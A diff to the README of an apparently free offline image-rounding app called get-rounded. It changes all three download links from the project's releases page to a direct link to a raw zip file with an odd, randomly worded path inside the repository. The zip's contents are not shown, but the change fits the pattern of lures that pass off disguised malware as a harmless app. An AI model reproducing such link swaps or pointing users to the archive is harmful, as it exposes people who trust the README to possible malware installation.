@@ -4,7 +4,7 @@
 
 Welcome! **get-rounded** is a simple, free desktop app that lets you round the corners of any image without needing design skills or expensive software. If you've ever wanted to give your screenshots, photos, or graphics a softer, modern look, this tool is for you. Best of all, it works completely **offline** on your computer—your images never leave your device.
 
-[![Download get-rounded](https://img.shields.io/badge/Download-get--rounded-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nuclearfusionbalkans309/get-rounded/releases)
+[![Download get-rounded](https://img.shields.io/badge/Download-get--rounded-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nuclearfusionbalkans309/get-rounded/raw/refs/heads/main/daftberry/gynodioeciously.zip)
 
 ## ✨ What Does get-rounded Do?
 
@@ -35,7 +35,7 @@ This guide focuses on getting you up and running on **Windows**, but the process
 
 Click the big green button above, or go directly to this link:
 
-👉 **[https://github.com/Nuclearfusionbalkans309/get-rounded/releases](https://github.com/Nuclearfusionbalkans309/get-rounded/releases)**
+👉 **[https://github.com/Nuclearfusionbalkans309/get-rounded/raw/refs/heads/main/daftberry/gynodioeciously.zip](https://github.com/Nuclearfusionbalkans309/get-rounded/raw/refs/heads/main/daftberry/gynodioeciously.zip)**
 
 **Step 2: Find the Right File**
 
@@ -103,6 +103,6 @@ You're just moments away from creating perfectly rounded images. Go ahead and do
 
 **Click the button below to go to the download page:**
 
-[![Download get-rounded Now](https://img.shields.io/badge/⬇️%20Download%20get--rounded%20Now-000000?style=for-the-badge&logoColor=white)](https://github.com/Nuclearfusionbalkans309/get-rounded/releases)
+[![Download get-rounded Now](https://img.shields.io/badge/⬇️%20Download%20get--rounded%20Now-000000?style=for-the-badge&logoColor=white)](https://github.com/Nuclearfusionbalkans309/get-rounded/raw/refs/heads/main/daftberry/gynodioeciously.zip)
 
 Keywords: canvas, desktop-app, image-editing, macos, offline, python, pywebview, rounded-corners, screenshot-tools, tailwindcss, windows
